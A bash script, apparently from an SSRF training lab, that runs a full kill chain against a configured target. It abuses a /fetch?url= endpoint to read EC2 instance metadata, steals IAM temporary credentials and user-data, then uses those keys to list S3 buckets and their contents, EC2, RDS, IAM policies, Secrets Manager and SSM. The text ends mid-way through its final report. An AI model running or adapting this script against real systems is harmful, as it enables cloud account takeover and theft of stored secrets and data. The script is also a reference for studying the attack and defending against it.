#!/usr/bin/env bash
# =============================================================================
# 07_full_kill_chain.sh — Full Kill Chain: SSRF -> IMDS Theft -> AWS Enumeration
# =============================================================================
# Purpose:
# Reproduce the entire kill chain as a real attacker would execute it.
# Explain each step along with 'why an attacker would do this',
# and ultimately demonstrate 'how far stolen credentials can reach'.
#
# Kill chain:
# Phase 1: Reconnaissance — Identify target's tech stack
# Phase 2: Vulnerability Discovery — Find and confirm SSRF endpoint
# Phase 3: Initial Access — Steal IMDS credentials via SSRF
# Phase 4: Credential Validation — Verify with aws sts get-caller-identity
# Phase 5: Enumeration — Enumerate AWS resources with stolen credentials
# Phase 6: Impact Assessment — Report attacker's reachable scope (blast radius)
#
# Learning points:
# - SSRF is not just a 'can fetch a URL' bug
# - Combined with IMDSv1, it becomes an intrusion path to the entire AWS account
# - The root cause is 'SSRF + IMDSv1', not 'Public Subnet is dangerous'
# - SSRF attacks work in both Config A/B as long as the app vulnerability exists
#
# Prerequisites:
# - AWS CLI must be installed (for credential validation and enumeration)
# - IAM role must be attached to EC2 (for credential theft)
#     Note: Even without a role, metadata leakage will be demonstrated
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "07: Full Kill Chain — SSRF -> IMDS Theft -> AWS Enumeration"

RESULT_FILE="07_full_kill_chain.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

# Counter to track attack success/failure
TOTAL_STEPS=0
SUCCESS_STEPS=0
CRITICAL_FINDINGS=0

# ---------------------------------------------------------------------------
# Helper: Record step results
# ---------------------------------------------------------------------------
record_success() {
 local msg="$1"
 ((SUCCESS_STEPS++)) || true
 ((TOTAL_STEPS++)) || true
 print_vulnerable "${msg}"
 result_text+="[SUCCESS] ${msg}"$'\n'
}

record_failure() {
 local msg="$1"
 ((TOTAL_STEPS++)) || true
 print_blocked "${msg}"
 result_text+="[BLOCKED] ${msg}"$'\n'
}

record_critical() {
 local msg="$1"
 ((CRITICAL_FINDINGS++)) || true
 record_success "${msg}"
}

# =============================================================================
# Phase 1: Reconnaissance(Reconnaissance)
# =============================================================================
# Attackers first identify the target's tech stack.
# Collect info from HTTP headers, endpoints, and error messages.
# =============================================================================
print_header "Phase 1: Reconnaissance — Identify target's tech stack"

result_text+="==============================="$'\n'
result_text+="Phase 1: Reconnaissance"$'\n'
result_text+="==============================="$'\n'

# --- 1a: HTTP header retrieval ---
echo -e "${BLUE}[*] 1a: Collect HTTP response headers${NC}"
echo -e "${BLUE} Attacker checks server type, framework, and presence of security headers${NC}"
echo ""

http_headers=$(curl -sI -m 10 "${TARGET_URL}/" 2>/dev/null) || http_headers=""

if [[ -n "${http_headers}" ]]; then
 echo "${http_headers}"
 result_text+="--- HTTP Headers ---"$'\n'
 result_text+="${http_headers}"$'\n'

 # Server info leakage check
 server_header=$(echo "${http_headers}" | grep -i "^Server:" | head -1 || echo "")
 if [[ -n "${server_header}" ]]; then
 echo -e "${RED} Server header exposed: ${server_header}${NC}"
 record_success "Web server info leaked from Server header: ${server_header}"
 fi

 # Check for missing security headers
 missing_headers=""
 for hdr in "X-Content-Type-Options" "X-Frame-Options" "Content-Security-Policy" "Strict-Transport-Security"; do
 if ! echo "${http_headers}" | grep -qi "${hdr}"; then
 missing_headers+="${hdr}, "
 fi
 done
 if [[ -n "${missing_headers}" ]]; then
 echo -e "${YELLOW} Missing security headers: ${missing_headers%%, }${NC}"
 result_text+="Missing security headers: ${missing_headers%%, }"$'\n'
 fi
else
 echo -e "${YELLOW} Failed to retrieve HTTP headers${NC}"
 result_text+="HTTP Headers: Retrieval failed"$'\n'
fi

echo ""

# --- 1b: /info endpoint internal info retrieval ---
echo -e "${BLUE}[*] 1b: Probe /info endpoint${NC}"
echo -e "${BLUE} Debug endpoints left by developers are a source of info leakage${NC}"
echo ""

info_response=$(curl -sS -m 10 "${TARGET_URL}/info" 2>/dev/null) || info_response=""

if [[ -n "${info_response}" ]] && echo "${info_response}" | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null; then
 echo -e "${RED} /info response:${NC}"
 echo "${info_response}" | python3 -m json.tool 2>/dev/null || echo "${info_response}"

 # Hostname and Private IP leakage
 hostname_val=$(echo "${info_response}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('hostname',''))" 2>/dev/null || echo "")
 private_ip_val=$(echo "${info_response}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('private_ip',''))" 2>/dev/null || echo "")

 if [[ -n "${hostname_val}" ]]; then
 record_success "/info leaked hostname: ${hostname_val}"
 fi
 if [[ -n "${private_ip_val}" ]]; then
 record_success "/info leaked Private IP: ${private_ip_val}"
 echo -e "${YELLOW} -> Attacker can infer internal network subnet structure${NC}"
 fi
else
 echo -e " /info: No response or not JSON"
 result_text+="/info: No response"$'\n'
fi

echo ""

# --- 1c: Endpoint enumeration ---
echo -e "${BLUE}[*] 1c: Enumerate common endpoints${NC}"
echo -e "${BLUE} Attackers try common paths by brute-force (dirbusting)${NC}"
echo ""

# List of paths commonly tried by attackers
PROBE_PATHS=(
 "/fetch"
 "/admin"
 "/api"
 "/debug"
 "/env"
 "/.env"
 "/config"
 "/status"
 "/metrics"
 "/swagger"
 "/graphql"
)

result_text+="--- Endpoint Enumeration ---"$'\n'
for path in "${PROBE_PATHS[@]}"; do
 status=$(curl -sS -o /dev/null -w "%{http_code}" -m 5 "${TARGET_URL}${path}" 2>/dev/null) || status="000"
 if [[ "${status}" != "000" && "${status}" != "404" && "${status}" != "405" ]]; then
 echo -e "${RED} ${path} → HTTP ${status}${NC}"
 result_text+=" ${path}: HTTP ${status}"$'\n'
 if [[ "${path}" == "/fetch" ]]; then
 record_success "Discovered /fetch endpoint exploitable for SSRF (HTTP ${status})"
 fi
 else
 echo -e " ${path} → HTTP ${status} (Does not exist)"
 fi
done

echo ""

# =============================================================================
# Phase 2: Vulnerability Discovery(Vulnerability Discovery)
# =============================================================================
# Check if /fetch endpoint is exploitable for SSRF.
# First confirm behavior with a harmless URL, then attempt to reach internal addresses.
# =============================================================================
print_header "Phase 2: Vulnerability Discovery — SSRF vulnerability confirmation"

result_text+=$'\n'"==============================="$'\n'
result_text+="Phase 2: Vulnerability Discovery"$'\n'
result_text+="==============================="$'\n'

# --- 2a: Confirm SSRF behavior with external URL ---
echo -e "${BLUE}[*] 2a: Check if /fetch can fetch external URLs${NC}"
echo -e "${BLUE} First confirm that 'SSRF works' with a harmless URL${NC}"
echo ""

external_test=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=https://httpbin.org/ip" 2>/dev/null) || external_test=""

if [[ -n "${external_test}" ]] && echo "${external_test}" | grep -qi "origin"; then
 echo -e "${RED} /fetch can fetch external URLs:${NC}"
 echo " ${external_test}"
 record_success "/fetch endpoint is exploitable for SSRF — Can fetch arbitrary URLs"
else
 echo -e " External URL fetch test: Failed"
 echo -e " Response: ${external_test:0:200}"
 result_text+="External URL fetch: Failed"$'\n'
fi

echo ""

# --- 2b: Confirm reachability to internal address ---
echo -e "${BLUE}[*] 2b: Check if internal address (169.254.169.254) is reachable via SSRF${NC}"
echo -e "${BLUE} 169.254.169.254 is the link-local address of EC2's metadata service (IMDS)${NC}"
echo -e "${BLUE} Unreachable from outside, but via SSRF it can be reached as if from EC2 itself${NC}"
echo ""

imds_test=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/" 2>/dev/null) || imds_test=""

if [[ -n "${imds_test}" ]] && echo "${imds_test}" | grep -qi "ami-id\|instance-id\|hostname"; then
 echo -e "${RED} IMDS metadata directory:${NC}"
 echo "${imds_test}" | head -20 | sed 's/^/ /'
 record_critical "Successfully reached IMDS via SSRF — Metadata is fully readable"
 IMDS_ACCESSIBLE=true
else
 echo -e " IMDS reachability test: Failed"
 echo -e " Response: ${imds_test:0:200}"

 if echo "${imds_test}" | grep -qi "Token required\|unauthorized\|401"; then
 record_failure "IMDSv2 is enforced — IMDS access from SSRF is blocked"
 else
 record_failure "Failed to reach IMDS"
 fi
 IMDS_ACCESSIBLE=false
fi

echo ""

# =============================================================================
# Phase 3: Initial Access — IMDS credential theft
# =============================================================================
# This is the core of the kill chain. Information is stolen step by step from IMDS.
# Attackers dig into metadata in the following order:
# 1. Basic info (instance-id, AZ, private-ip) -> Understand environment
# 2. Network info (MAC, VPC-ID, subnet-id) -> Map internal network
# 3. Security groups -> Understand firewall rules
# 4. IAM role name -> Confirm existence of credentials
# 5. IAM temp credentials -> Steal access to AWS account
# 6. User data -> Secrets embedded in startup scripts
# =============================================================================

# Skip Phase 3 onwards if IMDS is inaccessible
if [[ "${IMDS_ACCESSIBLE}" != "true" ]]; then
 print_header "Phase 3-6: Skipped (IMDS inaccessible)"
 echo -e "${GREEN} IMDSv2 is enabled or IMDS is blocked at network level.${NC}"
 echo -e "${GREEN} This is the correct defense that breaks the kill chain from SSRF.${NC}"
 result_text+=$'\n'"Phase 3-6: BLOCKED — IMDS inaccessible"$'\n'

 # Proceed to result summary
else

print_header "Phase 3: Initial Access — Steal credentials step by step from IMDS"

result_text+=$'\n'"==============================="$'\n'
result_text+="Phase 3: IMDS Credential Theft"$'\n'
result_text+="==============================="$'\n'

# --- 3a: Basic instance info ---
echo -e "${BLUE}[*] 3a: Collect basic instance information${NC}"
echo -e "${BLUE} Attackers first understand 'where they are'${NC}"
echo ""

declare -A instance_info
IMDS_PATHS=(
 "instance-id:latest/meta-data/instance-id"
 "ami-id:latest/meta-data/ami-id"
 "instance-type:latest/meta-data/instance-type"
 "availability-zone:latest/meta-data/placement/availability-zone"
 "region:latest/meta-data/placement/region"
 "local-ipv4:latest/meta-data/local-ipv4"
 "public-ipv4:latest/meta-data/public-ipv4"
 "local-hostname:latest/meta-data/local-hostname"
 "public-hostname:latest/meta-data/public-hostname"
)

result_text+="--- Basic Instance Info ---"$'\n'
for entry in "${IMDS_PATHS[@]}"; do
 label="${entry%%:*}"
 path="${entry#*:}"
 value=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/${path}" 2>/dev/null) || value=""

 # Return 'N/A' if IMDS returns 404 or error
 if echo "${value}" | grep -qi "404\|not found\|error\|<?xml"; then
 value="N/A"
 fi

 instance_info["${label}"]="${value}"
 echo -e " ${label}: ${value}"
 result_text+=" ${label}: ${value}"$'\n'
done

echo ""
record_success "Instance basic info fully leaked (ID, AMI, AZ, IP, etc.)"

# --- 3b: networkinfo(VPC, Subnet, MAC) ---
echo ""
echo -e "${BLUE}[*] 3b: Collect network info — Map the internal network${NC}"
echo ""

# First retrieve MAC address
mac_addr=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/mac" 2>/dev/null) || mac_addr=""
echo -e " MAC Address: ${mac_addr}"
result_text+="--- Network Info ---"$'\n'
result_text+=" MAC: ${mac_addr}"$'\n'

if [[ -n "${mac_addr}" ]] && ! echo "${mac_addr}" | grep -qi "404\|error"; then
 # Use MAC to retrieve VPC, Subnet, CIDR, etc.
 NET_PATHS=(
 "vpc-id:latest/meta-data/network/interfaces/macs/${mac_addr}/vpc-id"
 "subnet-id:latest/meta-data/network/interfaces/macs/${mac_addr}/subnet-id"
 "vpc-ipv4-cidr:latest/meta-data/network/interfaces/macs/${mac_addr}/vpc-ipv4-cidr-block"
 "subnet-ipv4-cidr:latest/meta-data/network/interfaces/macs/${mac_addr}/subnet-ipv4-cidr-block"
 "security-group-ids:latest/meta-data/network/interfaces/macs/${mac_addr}/security-group-ids"
 "owner-id:latest/meta-data/network/interfaces/macs/${mac_addr}/owner-id"
 )

 for entry in "${NET_PATHS[@]}"; do
 label="${entry%%:*}"
 path="${entry#*:}"
 value=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/${path}" 2>/dev/null) || value=""
 if echo "${value}" | grep -qi "404\|error\|<?xml"; then
 value="N/A"
 fi
 echo -e " ${label}: ${value}"
 result_text+=" ${label}: ${value}"$'\n'
 done

 echo ""
 record_critical "VPC ID, Subnet ID, CIDR, security groups, and AWS account ID leaked"
 echo -e "${YELLOW} -> Attacker can understand the full internal network picture and plan lateral movement${NC}"
fi

# --- 3c: IAM role credential theft (most dangerous step) ---
echo ""
echo -e "${RED}${BOLD}[*] 3c: IAM role credential theft — Core of the kill chain${NC}"
echo -e "${RED} If this succeeds, the attacker can access the entire AWS account beyond EC2${NC}"
echo ""

# Retrieve IAM role name
iam_role=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/" 2>/dev/null) || iam_role=""

CREDS_STOLEN=false
AWS_ACCESS_KEY=""
AWS_SECRET_KEY=""
AWS_SESSION_TOKEN=""

if [[ -n "${iam_role}" ]] && ! echo "${iam_role}" | grep -qi "404\|not found\|error\|<?xml"; then
 echo -e "${RED} IAM role found: ${iam_role}${NC}"
 result_text+="--- IAM Credentials ---"$'\n'
 result_text+="IAM role: ${iam_role}"$'\n'

 # Retrieve temporary credentials
 creds_json=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" 2>/dev/null) || creds_json=""

 if [[ -n "${creds_json}" ]] && echo "${creds_json}" | grep -qi "AccessKeyId"; then
 echo ""
 echo -e "${RED} ╔═══════════════════════════════════════════════════════╗${NC}"
 echo -e "${RED} ║ IAM temporary credentials stolen ║${NC}"
 echo -e "${RED} ║ Attacker has now gained access to the AWS account ║${NC}"
 echo -e "${RED} ╚═══════════════════════════════════════════════════════╝${NC}"
 echo ""

 # Parse credentials
 AWS_ACCESS_KEY=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('AccessKeyId',''))" 2>/dev/null || echo "")
 AWS_SECRET_KEY=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('SecretAccessKey',''))" 2>/dev/null || echo "")
 AWS_SESSION_TOKEN=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('Token',''))" 2>/dev/null || echo "")
 EXPIRATION=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('Expiration',''))" 2>/dev/null || echo "")

 echo -e " AccessKeyId: ${AWS_ACCESS_KEY}"
 echo -e " SecretAccessKey: ${AWS_SECRET_KEY:0:20}...(truncated)"
 echo -e " Token: ${AWS_SESSION_TOKEN:0:40}...(truncated)"
 echo -e " Expiration: ${EXPIRATION}"

 result_text+="AccessKeyId: ${AWS_ACCESS_KEY}"$'\n'
 result_text+="SecretAccessKey: [Theft succeeded - record omitted]"$'\n'
 result_text+="Token: [Theft succeeded - record omitted]"$'\n'
 result_text+="Expiration: ${EXPIRATION}"$'\n'

 if [[ -n "${AWS_ACCESS_KEY}" && -n "${AWS_SECRET_KEY}" ]]; then
 CREDS_STOLEN=true
 record_critical "IAM temporary credential theft succeeded — CRITICAL"
 fi
 else
 echo -e " Failed to retrieve credentials"
 echo -e " Response: ${creds_json:0:200}"
 result_text+="Credential theft: Failed"$'\n'
 fi
else
 echo -e "${YELLOW} IAM role not detected${NC}"
 echo -e "${YELLOW} If no IAM role is attached to EC2, credential theft is not possible${NC}"
 echo -e "${YELLOW} However, IMDSv1 access itself succeeded and metadata has leaked${NC}"
 result_text+="IAM role: Not found (no role)"$'\n'
 result_text+="Credential theft: Not possible (no role)"$'\n'
 print_info "Credential theft not possible due to no IAM role — However metadata leakage is still dangerous"
fi

# --- 3d: User data (startup script) theft ---
echo ""
echo -e "${BLUE}[*] 3d: Steal user data (startup script)${NC}"
echo -e "${BLUE} user-data often contains secrets such as DB passwords and API keys${NC}"
echo ""

userdata=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/user-data" 2>/dev/null) || userdata=""

result_text+="--- User Data ---"$'\n'

if [[ -n "${userdata}" ]] && ! echo "${userdata}" | grep -qi "404\|not found"; then
 echo -e "${RED} User data retrieved successfully:${NC}"
 echo "${userdata}" | head -40 | sed 's/^/ /'
 result_text+="${userdata}"$'\n'
 record_critical "User data leaked — Full contents of startup script are readable"

 # Scan for strings that look like secrets
 if echo "${userdata}" | grep -qiE "password|secret|key|token|api[_-]?key|credentials|DB_"; then
 echo ""
 echo -e "${RED} [!!] Detected strings that look like secrets in user data:${NC}"
 echo "${userdata}" | grep -iE "password|secret|key|token|api[_-]?key|credentials|DB_" | head -5 | sed 's/^/ /'
 record_critical "User data may contain secrets (passwords/tokens, etc.)"
 fi
else
 echo -e " User data: Could not retrieve (may not be configured)"
 result_text+="User data: Not retrievable"$'\n'
fi

echo ""

# --- 3e: instance IAMinfo (iam/info) ---
echo -e "${BLUE}[*] 3e: IAM Instance Profile Info${NC}"
echo ""

iam_info=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/info" 2>/dev/null) || iam_info=""

if [[ -n "${iam_info}" ]] && ! echo "${iam_info}" | grep -qi "404\|not found\|error"; then
 echo -e "${RED} IAM profile info:${NC}"
 echo "${iam_info}" | python3 -m json.tool 2>/dev/null | sed 's/^/ /' || echo " ${iam_info}"
 result_text+="--- IAM Profile Info ---"$'\n'
 result_text+="${iam_info}"$'\n'
 record_success "IAM instance profile ARN leaked"
else
 echo -e " IAM profile info: Could not retrieve"
 result_text+="IAM profile info: None"$'\n'
fi

echo ""

# =============================================================================
# Phase 4: Credential Validation(Credential Validation)
# =============================================================================
# Verify if stolen credentials are actually valid with aws sts get-caller-identity.
# Attackers always perform this check. There's no point continuing with invalid credentials.
# =============================================================================
print_header "Phase 4: Credential Validation — aws sts get-caller-identity"

result_text+=$'\n'"==============================="$'\n'
result_text+="Phase 4: Credential Validation"$'\n'
result_text+="==============================="$'\n'

if [[ "${CREDS_STOLEN}" == "true" ]]; then
 if require_tool aws; then
 echo -e "${BLUE}[*] Executing aws sts get-caller-identity with stolen credentials${NC}"
 echo -e "${BLUE} Attacker confirms 'who am I authenticated as'${NC}"
 echo ""

 # Set stolen credentials in env vars (current shell only, not persisted)
 caller_identity=$(AWS_ACCESS_KEY_ID="${AWS_ACCESS_KEY}" \
 AWS_SECRET_ACCESS_KEY="${AWS_SECRET_KEY}" \
 AWS_SESSION_TOKEN="${AWS_SESSION_TOKEN}" \
 aws sts get-caller-identity 2>&1) || caller_identity="Error: $?"

 echo -e "${RED} get-caller-identity result:${NC}"
 echo "${caller_identity}" | python3 -m json.tool 2>/dev/null | sed 's/^/ /' || echo " ${caller_identity}"

 result_text+="${caller_identity}"$'\n'

 if echo "${caller_identity}" | grep -qi "UserId\|Account\|Arn"; then
 record_critical "Stolen credentials are valid — Access to AWS account confirmed"

 # Extract account ID and role ARN
 account_id=$(echo "${caller_identity}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('Account',''))" 2>/dev/null || echo "")
 role_arn=$(echo "${caller_identity}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('Arn',''))" 2>/dev/null || echo "")

 echo ""
 echo -e "${RED} AWS Account ID: ${account_id}${NC}"
 echo -e "${RED} Role ARN: ${role_arn}${NC}"
 else
 echo -e "${YELLOW} Credential validation failed: ${caller_identity}${NC}"
 result_text+="Credential validation: Failed"$'\n'
 fi
 else
 echo -e "${YELLOW} AWS CLI not installed, skipping credential validation${NC}"
 echo -e "${YELLOW} Install: brew install awscli${NC}"
 result_text+="Credential validation: AWS CLI not installed"$'\n'
 fi
else
 echo -e "${YELLOW} Skipping this phase since credentials were not stolen${NC}"
 result_text+="Credential validation: Skipped (no credentials)"$'\n'
fi

echo ""

# =============================================================================
# Phase 5: Enumeration — Enumerate AWS resources with stolen credentials
# =============================================================================
# Attacker enumerates all accessible AWS resources with stolen credentials.
# This reveals the 'Blast Radius' = the attack's impact scope.
# =============================================================================
print_header "Phase 5: Enumeration — Attempt access to AWS resources"

result_text+=$'\n'"==============================="$'\n'
result_text+="Phase 5: AWS Enumeration"$'\n'
result_text+="==============================="$'\n'

if [[ "${CREDS_STOLEN}" == "true" ]] && require_tool aws; then
 # All subsequent AWS CLI commands use stolen credentials
 export AWS_ACCESS_KEY_ID="${AWS_ACCESS_KEY}"
 export AWS_SECRET_ACCESS_KEY="${AWS_SECRET_KEY}"
 export AWS_SESSION_TOKEN="${AWS_SESSION_TOKEN}"

 # Use region from IMDS or default
 region="${instance_info[region]:-ap-northeast-1}"
 if [[ "${region}" == "N/A" || -z "${region}" ]]; then
 # Infer from AZ
 az_val="${instance_info[availability-zone]:-}"
 if [[ -n "${az_val}" && "${az_val}" != "N/A" ]]; then
 region="${az_val%[a-z]}"
 else
 region="ap-northeast-1"
 fi
 fi
 export AWS_DEFAULT_REGION="${region}"

 echo -e "${BLUE}[*] Attempting access to the following AWS services with stolen credentials:${NC}"
 echo ""

 # --- 5a: S3bucketlist ---
 echo -e "${BLUE}[*] 5a: Retrieve S3 bucket list${NC}"
 s3_result=$(aws s3 ls 2>&1) || s3_result="AccessDenied"
 result_text+="--- S3 ---"$'\n'

 if echo "${s3_result}" | grep -qi "AccessDenied\|error\|not authorized"; then
 echo -e "${GREEN} S3 ListBuckets: Access denied${NC}"
 result_text+="S3 ls: DENIED"$'\n'
 record_failure "S3 bucket list: Access denied"
 else
 echo -e "${RED} S3 bucket list:${NC}"
 echo "${s3_result}" | head -20 | sed 's/^/ /'
 bucket_count=$(echo "${s3_result}" | grep -c "^20" || echo "0")
 record_critical "Successfully accessed S3 bucket list — ${bucket_count} buckets visible"
 result_text+="${s3_result}"$'\n'

 # Enumerate contents of each bucket (first 5 only)
 echo ""
 echo -e "${BLUE} Enumerate contents of each bucket:${NC}"
 echo "${s3_result}" | awk '{print $3}' | head -5 | while read -r bucket; do
 if [[ -n "${bucket}" ]]; then
 objects=$(aws s3 ls "s3://${bucket}/" --summarize 2>&1 | tail -5) || objects="Access denied"
 echo -e " ${bucket}:"
 echo "${objects}" | sed 's/^/ /'
 result_text+=" ${bucket}: ${objects}"$'\n'
 fi
 done
 fi

 echo ""

 # --- 5b: EC2instancelist ---
 echo -e "${BLUE}[*] 5b: Retrieve EC2 instance list${NC}"
 ec2_result=$(aws ec2 describe-instances --query 'Reservations[].Instances[].{InstanceId:InstanceId,State:State.Name,PrivateIp:PrivateIpAddress,PublicIp:PublicIpAddress,Type:InstanceType,SecurityGroups:SecurityGroups[].GroupId,IamProfile:IamInstanceProfile.Arn}' --output table 2>&1) || ec2_result="AccessDenied"
 result_text+="--- EC2 ---"$'\n'

 if echo "${ec2_result}" | grep -qi "AccessDenied\|error\|not authorized"; then
 echo -e "${GREEN} EC2 DescribeInstances: Access denied${NC}"
 result_text+="EC2 describe-instances: DENIED"$'\n'
 record_failure "EC2 instance list: Access denied"
 else
 echo -e "${RED} EC2 instance list:${NC}"
 echo "${ec2_result}" | head -30 | sed 's/^/ /'
 record_critical "Successfully accessed EC2 instance details (Private IP, SG, IAM role)"
 result_text+="${ec2_result}"$'\n'
 fi

 echo ""

 # --- 5c: RDSinstancelist ---
 echo -e "${BLUE}[*] 5c: Retrieve RDS instance list${NC}"
 rds_result=$(aws rds describe-db-instances --query 'DBInstances[].{DBId:DBInstanceIdentifier,Engine:Engine,Endpoint:Endpoint.Address,Port:Endpoint.Port,DBName:DBName,MasterUsername:MasterUsername,VpcSecurityGroups:VpcSecurityGroups[].VpcSecurityGroupId}' --output table 2>&1) || rds_result="AccessDenied"
 result_text+="--- RDS ---"$'\n'

 if echo "${rds_result}" | grep -qi "AccessDenied\|error\|not authorized"; then
 echo -e "${GREEN} RDS DescribeDBInstances: Access denied${NC}"
 result_text+="RDS describe-db-instances: DENIED"$'\n'
 record_failure "RDS instance list: Access denied"
 else
 echo -e "${RED} RDS instance list:${NC}"
 echo "${rds_result}" | head -20 | sed 's/^/ /'
 record_critical "Successfully accessed RDS connection info (endpoint, DB name, master username)"
 result_text+="${rds_result}"$'\n'
 echo -e "${YELLOW} -> Attacker now knows RDS endpoint and DB name. Just need the password.${NC}"
 fi

 echo ""

 # --- 5d: IAM policy enumeration ---
 echo -e "${BLUE}[*] 5d: Enumerate own IAM policies (check what's possible)${NC}"

 # Role's attached policies
 if [[ -n "${role_arn:-}" ]]; then
 role_name=$(echo "${role_arn}" | grep -o '[^/]*$' || echo "")
 # For assumed-role, role name is the 2nd slash-delimited part of ARN
 if echo "${role_arn}" | grep -q "assumed-role"; then
 role_name=$(echo "${role_arn}" | awk -F'/' '{print $2}')
 fi

 if [[ -n "${role_name}" ]]; then
 echo -e " Role name: ${role_name}"
 attached_policies=$(aws iam list-attached-role-policies --role-name "${role_name}" --output table 2>&1) || attached_policies="AccessDenied"
 result_text+="--- IAM Policies ---"$'\n'

 if echo "${attached_policies}" | grep -qi "AccessDenied\|error\|not authorized"; then
 echo -e "${GREEN} IAM ListAttachedRolePolicies: Access denied${NC}"
 result_text+="IAM list-attached-role-policies: DENIED"$'\n'
 record_failure "IAM policy enumeration: Access denied"
 else
 echo -e "${RED} Attached policies:${NC}"
 echo "${attached_policies}" | sed 's/^/ /'
 record_critical "Successfully accessed IAM role policy list — Full permission picture revealed"
 result_text+="${attached_policies}"$'\n'
 fi

 # Inline policies
 inline_policies=$(aws iam list-role-policies --role-name "${role_name}" --output table 2>&1) || inline_policies="AccessDenied"
 if ! echo "${inline_policies}" | grep -qi "AccessDenied\|error"; then
 echo -e "${RED} Inline policies:${NC}"
 echo "${inline_policies}" | sed 's/^/ /'
 result_text+="Inline policies: ${inline_policies}"$'\n'
 fi
 fi
 fi

 echo ""

 # --- 5e: Secrets Manager / SSM Parameter Store ---
 echo -e "${BLUE}[*] 5e: Attempt access to secret stores${NC}"

 # Secrets Manager
 secrets_result=$(aws secretsmanager list-secrets --output table 2>&1) || secrets_result="AccessDenied"
 result_text+="--- Secrets Manager ---"$'\n'

 if echo "${secrets_result}" | grep -qi "AccessDenied\|error\|not authorized"; then
 echo -e "${GREEN} Secrets Manager: Access denied${NC}"
 result_text+="Secrets Manager: DENIED"$'\n'
 record_failure "Secrets Manager: Access denied"
 else
 echo -e "${RED} Secrets Manager contents:${NC}"
 echo "${secrets_result}" | head -20 | sed 's/^/ /'
 record_critical "Secrets Manager access succeeded — Stored secrets are viewable"
 result_text+="${secrets_result}"$'\n'
 fi

 # SSM Parameter Store
 ssm_result=$(aws ssm describe-parameters --output table 2>&1) || ssm_result="AccessDenied"
 result_text+="--- SSM Parameter Store ---"$'\n'

 if echo "${ssm_result}" | grep -qi "AccessDenied\|error\|not authorized"; then
 echo -e "${GREEN} SSM Parameter Store: Access denied${NC}"
 result_text+="SSM Parameter Store: DENIED"$'\n'
 record_failure "SSM Parameter Store: Access denied"
 else
 echo -e "${RED} SSM parameter list:${NC}"
 echo "${ssm_result}" | head -20 | sed 's/^/ /'
 record_critical "SSM Parameter Store access succeeded"
 result_text+="${ssm_result}"$'\n'
 fi

 echo ""

 # --- 5f: VPC/Security Group info ---
 echo -e "${BLUE}[*] 5f: VPC/Security Group details${NC}"

 sg_result=$(aws ec2 describe-security-groups --output table 2>&1) || sg_result="AccessDenied"
 result_text+="--- Security Groups ---"$'\n'

 if echo "${sg_result}" | grep -qi "AccessDenied\|error\|not authorized"; then
 echo -e "${GREEN} EC2 DescribeSecurityGroups: Access denied${NC}"
 result_text+="describe-security-groups: DENIED"$'\n'
 record_failure "Security group details: Access denied"
 else
 echo -e "${RED} Security group list:${NC}"
 echo "${sg_result}" | head -40 | sed 's/^/ /'
 record_critical "Successfully accessed all security group rules — Firewall config fully exposed"
 result_text+="${sg_result}"$'\n'
 fi

 # Clear env vars (for safety)
 unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_DEFAULT_REGION

else
 if [[ "${CREDS_STOLEN}" != "true" ]]; then
 echo -e "${YELLOW} Skipping AWS enumeration since credentials were not stolen${NC}"
 result_text+="AWS enumeration: Skipped (no credentials)"$'\n'
 else
 echo -e "${YELLOW} AWS CLI not installed, skipping AWS enumeration${NC}"
 result_text+="AWS enumeration: AWS CLI not installed"$'\n'
 fi
fi

echo ""

# Close the IMDS_ACCESSIBLE if block
fi

# =============================================================================
# Phase 6: Impact Assessment — Blast Radius Report
# =============================================================================
print_header "Phase 6: Impact Assessment — Blast Radius Report"

result_text+=$'\n'"==============================="$'\n'
result_text+="Phase 6: Blast Radius Report"$'\n'
result_text+="==============================="$'\n'

echo -e "${BOLD}╔═══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║ Kill Chain Result Report ║${NC}"
echo -e "${BOLD}╠═══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}║ Config: ${CONFIG_LABEL}${NC}"
echo -e "${BOLD}║ Attack steps: ${TOTAL_STEPS} executed / ${SUCCESS_STEPS} succeeded / ${CRITICAL_FINDINGS} Critical${NC}"
echo -e "${BOLD}╠═══════════════════════════════════════════════════════════════════╣${NC}"

result_text+="Config: ${CONFIG_LABEL}"$'\n'
result_text+="Attack steps: ${TOTAL_STEPS}executed, ${SUCCESS_STEPS}succeeded, ${CRITICAL_FINDINGS}Critical"$'\n'

if [[ "${CREDS_STOLEN}" == "true" ]]; then
 echo -e "${RED}║ ║${NC}"
 echo -e "${RED}║ [CRITICAL] IAM credentials were stolen ║${NC}"
 echo -e "${RED}║ ║${NC}"
 echo -e "${RED}║ What the attacker can do: ║${NC}"
 echo -e "${RED}║ - Can call arbitrary AWS APIs within the IAM role's permission scope ║${NC}"
 echo -e "${RED}║ - Can exfiltrate S3 bucket data ║${NC}"
 echo -e "${RED}║ - Can plan lateral movement from EC2/RDS detailed info ║${NC}"
